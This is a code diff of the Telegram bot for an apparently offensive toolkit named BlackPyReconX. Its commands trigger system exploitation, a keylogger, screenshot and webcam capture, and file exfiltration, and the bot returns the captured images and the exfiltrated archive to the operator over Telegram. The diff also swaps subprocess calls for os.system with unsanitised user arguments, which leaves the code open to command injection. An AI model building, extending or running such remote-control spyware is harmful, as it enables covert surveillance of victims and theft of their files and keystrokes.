@@ -1,8 +1,11 @@
+# telegram_bot/telegram_bot.py
+
 import os
-import subprocess
 from pathlib import Path
 from telegram import Update, InputFile
-from telegram.ext import ContextTypes
+from telegram.ext import (
+    CommandHandler, ContextTypes, Application
+)
 
 from modules.utils import get_api_keys
 
@@ -20,7 +23,7 @@ SCREENSHOTS = OUTPUTS / "screenshots"
 # === Commandes ===
 
 async def menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    await safe_reply(update, context, text=(
+    await update.message.reply_text(
         "🕷️ *BlackPyReconX* - Menu des commandes :\n\n"
         "🔍 `/osint <ip|domaine>`\n"
         "🛠️ `/scan <ip>`\n"
@@ -30,73 +33,85 @@ async def menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "📷 `/webcam_snap`\n"
         "📤 `/exfiltrate`\n"
         "📂 `/exfiltrate_path <chemin>`\n"
-        "🧾 `/rapport`\n"
-    ), markdown=True)
+        "🧾 `/rapport`\n",
+        parse_mode="Markdown"
+    )
 
 async def osint(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not context.args:
-        return await safe_reply(update, context, "❗ Usage : /osint <ip ou domaine>")
+        return await update.message.reply_text("❗ Usage : /osint <ip ou domaine>")
     cible = context.args[0]
-    subprocess.run(f"python main.py --target {cible} --osint", shell=True)
-    await safe_send_document(update, context, OUTPUTS / "osint.txt")
+    os.system(f"python main.py --target {cible} --osint")
+    await update.message.reply_document(InputFile(OUTPUTS / "osint.txt"))
 
 async def scan(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not context.args:
-        return await safe_reply(update, context, "❗ Usage : /scan <ip>")
+        return await update.message.reply_text("❗ Usage : /scan <ip>")
     cible = context.args[0]
-    subprocess.run(f"python main.py --target {cible} --scan", shell=True)
-    await safe_send_document(update, context, OUTPUTS / "scan_results.txt")
+    os.system(f"python main.py --target {cible} --scan")
+    await update.message.reply_document(InputFile(OUTPUTS / "scan_results.txt"))
 
 async def exploit_sys(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not context.args:
-        return await safe_reply(update, context, "❗ Usage : /exploit_sys <ip>")
+        return await update.message.reply_text("❗ Usage : /exploit_sys <ip>")
     cible = context.args[0]
-    subprocess.run(f"python main.py --target {cible} --exploit_sys", shell=True)
-    await safe_reply(update, context, "✅ Exploitation système lancée.")
+    os.system(f"python main.py --target {cible} --exploit_sys")
+    await update.message.reply_text("✅ Exploitation système lancée.")
 
 async def screenshot(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    subprocess.run("python modules/exploit_sys.py --screenshot", shell=True)
-    await safe_send_document(update, context, SCREENSHOTS / "screenshot_latest.png", fallback="❌ Aucune capture trouvée.")
+    os.system("python modules/exploit_sys.py --screenshot")
+    screenshot_path = SCREENSHOTS / "screenshot_latest.png"
+    if screenshot_path.exists():
+        await update.message.reply_document(InputFile(screenshot_path))
+    else:
+        await update.message.reply_text("❌ Aucune capture trouvée.")
 
 async def keylogger_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    subprocess.run("python modules/exploit_sys.py --keylogger", shell=True)
-    await safe_reply(update, context, "🎹 Keylogger démarré.")
+    os.system("python modules/exploit_sys.py --keylogger")
+    await update.message.reply_text("🎹 Keylogger démarré.")
 
 async def webcam_snap(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    subprocess.run("python modules/exploit_sys.py --webcam", shell=True)
-    await safe_send_document(update, context, SCREENSHOTS / "webcam_latest.png", fallback="❌ Aucune image webcam trouvée.")
+    os.system("python modules/exploit_sys.py --webcam")
+    webcam_path = SCREENSHOTS / "webcam_latest.png"
+    if webcam_path.exists():
+        await update.message.reply_document(InputFile(webcam_path))
+    else:
+        await update.message.reply_text("❌ Aucune image webcam trouvée.")
 
 async def exfiltrate(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    subprocess.run("python main.py --exfil", shell=True)
-    await safe_send_document(update, context, OUTPUTS / "exfiltrated.zip", fallback="❌ Aucune archive exfiltrée trouvée.")
+    os.system("python main.py --exfil")
+    archive = OUTPUTS / "exfiltrated.zip"
+    if archive.exists():
+        await update.message.reply_document(InputFile(archive))
+    else:
+        await update.message.reply_text("❌ Aucune archive exfiltrée trouvée.")
 
 async def exfiltrate_path(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not context.args:
-        return await safe_reply(update, context, "❗ Usage : /exfiltrate_path <chemin>")
+        return await update.message.reply_text("❗ Usage : /exfiltrate_path <chemin>")
     chemin = " ".join(context.args)
-    subprocess.run(f"python main.py --exfiltrate_path \"{chemin}\"", shell=True)
-    await safe_reply(update, context, f"📂 Exfiltration de `{chemin}` terminée.", markdown=True)
+    os.system(f"python main.py --exfiltrate_path \"{chemin}\"")
+    await update.message.reply_text(f"📂 Exfiltration de `{chemin}` terminée.", parse_mode="Markdown")
 
 async def rapport(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    subprocess.run("python modules/reporting.py", shell=True)
-    await safe_send_document(update, context, OUTPUTS / "rapport_final.txt", fallback="❌ Rapport introuvable.")
+    os.system("python modules/reporting.py")
+    rapport_path = OUTPUTS / "rapport_final.txt"
+    if rapport_path.exists():
+        await update.message.reply_document(InputFile(rapport_path))
+    else:
+        await update.message.reply_text("❌ Rapport introuvable.")
 
-# === Fonctions utilitaires protégées ===
+# === Instance Application (pour webhook.py) ===
+application: Application = Application.builder().token(TOKEN).build()
 
-async def safe_reply(update, context, text, markdown=False):
-    try:
-        await update.message.reply_text(
-            text,
-            parse_mode="Markdown" if markdown else None
-        )
-    except Exception as e:
-        print(f"❌ Erreur en reply : {e}")
-
-async def safe_send_document(update, context, path, fallback=None):
-    try:
-        if Path(path).exists():
-            await update.message.reply_document(InputFile(path))
-        elif fallback:
-            await update.message.reply_text(fallback)
-    except Exception as e:
-        print(f"❌ Erreur envoi document : {e}")
+# === Ajout des handlers ===
+application.add_handler(CommandHandler("menu", menu))
+application.add_handler(CommandHandler("osint", osint))
+application.add_handler(CommandHandler("scan", scan))
+application.add_handler(CommandHandler("exploit_sys", exploit_sys))
+application.add_handler(CommandHandler("screenshot", screenshot))
+application.add_handler(CommandHandler("keylogger_start", keylogger_start))
+application.add_handler(CommandHandler("webcam_snap", webcam_snap))
+application.add_handler(CommandHandler("exfiltrate", exfiltrate))
+application.add_handler(CommandHandler("exfiltrate_path", exfiltrate_path))
+application.add_handler(CommandHandler("rapport", rapport))
